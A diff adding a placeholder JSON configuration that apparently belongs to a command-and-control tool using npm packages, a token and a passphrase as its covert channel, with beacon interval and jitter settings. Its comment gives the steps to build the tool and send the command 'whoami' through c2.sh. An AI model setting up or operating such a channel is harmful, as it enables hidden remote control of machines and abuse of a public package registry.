@@ -1,0 +1,11 @@
+{
+  "_comment": "Copy to config.json, change the four values below, then run python3 build.py and ./c2.sh 'whoami'.",
+
+  "package": "your-package-name",
+  "token": "npm_REPLACE_ME",
+  "channel": "c0ff",
+  "passphrase": "change-this-passphrase",
+
+  "interval": 60,
+  "jitter": 20
+}
